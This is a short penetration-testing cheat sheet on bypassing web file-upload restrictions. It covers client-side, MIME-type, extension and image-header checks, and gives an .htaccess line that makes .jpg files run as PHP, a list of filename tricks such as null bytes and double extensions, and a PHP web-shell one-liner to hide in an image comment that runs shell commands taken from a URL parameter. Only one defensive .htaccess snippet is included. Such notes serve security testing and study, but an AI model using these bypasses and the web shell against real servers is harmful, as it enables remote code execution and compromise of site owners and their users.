

####Forms of upload restrictions and how to bypass them
#####Client Side verification
If crafting a curl/wget request is not trivial, use Chrome developer tools to override the Javascript check. Or upload an accepted file and copy the request on Burp.

#####MIME Type check
This is done on the server, to bypass, intercept with Burp Suite and modify the MIME type field on the HTTP request
Change `Content-Type: application/x-http-php` for `Content-Type: image/jpg`

#####Extension check
It is possible to upload an *.htaccess* file that allows to execute the permitted extensions, with one line:
```
AddType application/x-httpd-php .jpg
```
If the server is checking for the string after the last dot, it is possible to use a file name such as `<filename>.php.123`, apache will use the first extension found in this case if extension `.123` is not specified in the list of mime-types known to the server.

If the `AddHandler php5-script.php` directive in the configuration file is used (instead of `AddType`) then the second extension in the method above doesn't matter, any file with `.php` extension will be used as a script.

Other forms:
+ &lt;filename>.php.jpg
+ &lt;filename>.php.
+ &lt;filename>.PhP
+ &lt;filename>.php%00
+ &lt;filename>.jpg.php
+ &lt;filename>.jpg.PhP
+ &lt;filename>.php;.jpg
+ &lt;filename>.php%0delete0.jpg
+ &lt;filename>.php.xxxjpg
+ &lt;filename>.phtml
+ &lt;filename>.php3/4/5

#####Checking the image header
If the server checks for an image header, use *Gimp* to create an image and insert PHP code in the image comment.

`<?if($_GET['r0ng']){echo"<pre>".shell_exec($_GET["r0ng"]);}?>`

#####Using *.htaccess* to restrict script execution
The directive below can prevent scripts from executing:
```
AddHandler cgi-script .php .php3 .php4 .phtml .pl .py .jsp .asp .htm .shtml .sh .cgi
Options â€“ExecCGI
```
Still the file *.htaccess* can be overwritten.

####Links
https://www.acunetix.com/websitesecurity/upload-forms-threat/

https://pentestlab.wordpress.com/tag/mime-type/

http://hackers2devnull.blogspot.com/2013/05/how-to-shell-server-via-image-upload.html
